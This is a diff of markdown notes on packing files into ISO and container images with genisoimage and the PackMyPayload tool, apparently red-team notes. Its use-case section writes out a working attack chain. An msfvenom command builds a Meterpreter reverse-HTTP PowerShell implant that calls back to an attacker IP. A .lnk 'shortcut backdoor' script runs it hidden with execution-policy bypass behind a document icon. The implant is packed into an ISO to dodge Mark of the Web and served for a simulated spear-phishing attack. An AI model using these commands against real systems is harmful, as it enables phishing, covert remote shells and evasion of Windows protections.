@@ -4,31 +4,37 @@
 
 ### 1.1 - Dependencies
 
-- Debian-based distros
+Debian-based distros.
 
-`$ sudo apt install mkisofs`
+```
+$ sudo apt install -y genisoimage
+```
 
-- Arch-based distros
+Arch-based distros.
 
-`$ sudo pacman -S cdrkit`
+```
+$ sudo pacman -S genisoimage
+```
 
 ### 1.2 - Usage
 
-`$ mkisofs -o file.iso file.txt`
+```
+$ genisoimage -o file.iso file.txt
 
-`$ mkisofs -r -J -o file.iso /path/to/directory`
+$ genisoimage -rJo file.iso /path/to/directory
+```
 
 ## 02 - Automated
 
 ### 2.1 - Install
 
-- Install the Visual C++ Build Tools
+Install the Visual C++ Build Tools.
 
 - https://visualstudio.microsoft.com/visual-cpp-build-tools
 
-- Turn off aliases for Python
+Turn off aliases for Python
 
-Search **Manage app execution aliases**
+Search **Manage app execution aliases.**
 
 ![[01 - Windows Search Bar.png]]
 
@@ -36,7 +42,7 @@ Turn off the **App Installers**
 
 ![[02 - Manage app execution aliases.png]]
 
-- Then install the Python packages
+Then install the Python packages.
 
 ```
 C:\> git clone https://github.com/mgeeky/PackMyPayload.git
@@ -109,30 +115,34 @@ Supported container/archive formats:
 
 ### 2.3 - Usage
 
-#### 2.3.1 - Pack an ISO File
+#### 2.3.1 - Archive files
 
-`C:\PackMyPayload> python PackMyPayload.py Archived_Folder.zip ISO_File.iso`
+```
+C:\PackMyPayload> python PackMyPayload.py [-p <password>] --out-format <zip | 7z | cab | pdf> [<drive_letter>:]\path\to\directory\ archive.<zip | 7z | cab | pdf>
+```
+
+#### 2.3.2 - Pack files inside container file
+
+```
+C:\PackMyPayload> python PackMyPayload.py [-p <password>] [--vhd-filesystem <fat | fat32 | ntfs>] --out-format <iso | img | vhd | vhdx> file.txt file.<iso | img | vhd | vhdx>
+```
 
 ### 2.4 - Use Cases
 
 #### 2.4.1 - Powershell Loader via Shortcut Lnk
 
 ```
-$ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | base64 -d > shell.ps1
+$ msfvenom -p windows/x64/meterpreter/reverse_http[s] lhost=<IP> lport=80 -f psh-cmd | sed 's/%COMSPEC% \/b \/c start \/b \/min powershell\.exe -nop -w hidden -e //g' | basenc -d --base64 > implant.ps1
 ```
 
-Transfer the generated powershell reverse shell to the windows box to create .lnk shortcut and pack them into an ISO file
-
-`$ cat pwsh_cmds.txt`
-
----
+Transfer the generated powershell reverse shell to the windows box to create `.lnk` shortcut and pack them into an ISO file
 
 ```powershell
-$shortcutPath = "C:\Users\" + $Env:USERNAME + "\Desktop\Resume.lnk"  
+PS C:\> $shortcutPath = "[<drive_letter>:]\path\to\directory\file.lnk"  
 $WshShell = New-Object -ComObject WScript.Shell  
 $Shortcut = $WshShell.CreateShortcut($shortcutPath)  
 $Shortcut.TargetPath = 'conhost.exe'  
-$Shortcut.Arguments = "--headless powershell.exe -noni -nop -ep bypass -file shell.ps1"  
+$Shortcut.Arguments = "--headless powershell.exe -noni -nop -ep bypass -file implant.ps1"  
 $Shortcut.Description = "A shortcut backdoor"  
 $Shortcut.IconLocation = 'C:\path\to\document.docx'  
 $Shortcut.hotkey = 'CTRL+C' # A hotkey to trigger the payload  
@@ -141,11 +151,13 @@ $Shortcut.WorkingDirectory = "C:\Users\" + Eenv:USERNAME + "\Public"
 $Shortcut.Save()
 ```
 
+Pack the files in a container.
+
 ```
-C:\PackMyPayload> python PackMyPayload.py --hide C:\path\to\directory\shell.ps1 --out-format iso C:\path\to\directory ISO_File.iso -v
+C:\PackMyPayload> python PackMyPayload.py [--vhd-filesystem <fat | fat32 | ntfs>] --hide [<drive_letter>:]\path\to\directory\implant.ps1 --out-format iso C:\path\to\directory\ ISO_File.iso
 ```
 
-Then copy the ISO File to your attacker machine and start a web server to simulate the spear phishing attack then finally you'll see **MOTW (Mark of the Web)** has not contaminated the `.lnk` shortcut file
+Then copy the ISO File to your attacker machine and start a web server to simulate the spear phishing attack then finally you'll see **MOTW (Mark of the Web)** has not contaminated the `.lnk` shortcut file.
 
 ```
 $ sudo python -m http.server 80
